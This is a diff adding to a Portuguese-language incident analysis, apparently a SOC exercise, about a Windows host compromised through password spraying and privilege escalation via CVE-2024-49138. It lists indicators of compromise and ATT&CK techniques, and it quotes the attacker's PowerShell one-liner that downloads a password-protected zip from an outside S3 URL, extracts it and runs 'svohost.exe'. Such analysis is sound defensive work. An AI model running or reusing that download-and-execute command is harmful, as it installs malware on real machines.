@@ -86,7 +86,24 @@ Uma sequência de tão poucas tentativas de login (5 no total) e a distribuiçã
 O sistema de *hostname* *Victor* foi **totalmente comprometido** após o invasor tomar controle do usuário *SYSTEM*. Além disto, as credenciais do usuário *Victor* também foram comprometidas, o que pode indicar *credencial exposure* explorado pelo invasor.
 ### Indicadores de Compromisso (IOCs)
 * **IP do Invasor**: 185.107.56.141
-* **Exploit da CVE-2024-49138*:
+* **Exploit utilizado**: 
   * **Hash**: b432dcf4a0f0b601b1d79848467137a5e25cab5a0b7b1224be9d3b6540122db9
   * **Processo malicioso**: svohost.exe
   * **PID**: 7640
+  * **Fonte maliciosa (URL)**: https://files-ld.s3.us-east-2.amazonaws.com/
+  * **Vulnerabilidade explorada**: CVE-2024-49138
+* **Usuários comprometidos**:
+  * **Victor**
+  * **NT/SYSTEM**
+* **Script malicioso**:
+  ```Powershell
+  $url = 'https://files-ld.s3.us-east-2.amazonaws.com/service-installer.zip'; $dest = 'C:\temp\service-installer.zip'; $extractPath = 'C:\temp'; $password = 'infected'; if (-not (Test-Path -Path $extractPath)) { New-Item -ItemType Directory -Path $extractPath -Force | Out-Null }; Invoke-WebRequest -Uri $url -OutFile $dest; $7zipPath = 'C:\Program Files\7-Zip\7z.exe'; Start-Process -FilePath $7zipPath -ArgumentList "x -p$password -o$extractPath $dest" -NoNewWindow -Wait -PassThru; Remove-Item -Path $dest; Start-Process -FilePath "$extractPath\service_installer\svohost.exe"
+  ```
+### ATT&CK
+* **T1068 - Exploitation for Privilege Escalation**: Exploração vulnerabilidade para obtenção de acesso ao usuário **SYSTEM**.
+* **T1110.003 - Password Spraying**: Tentativas enxutas e direcionadas de login no sistema *Victor*.
+* **T1190 - Exploit Public-Facing Application**: Exploração da CVE-2024-49138.
+* **T1059.001 - Command and Scripting Interpreter: PowerShell**: Utilização de script Powershell para download e execução de malware.
+
+### Conclusão
+O alerta se classifica como **positivo verdadeiro** após a análise conduzida em logs, endpoint e threat intelligence disponíveis. O invasor obteve a credencial do usuário *Victor* em seu sistema, e logou com sucesso após poucas tentativas, escalando privilégios através da exploração da CVE-2024-49138.
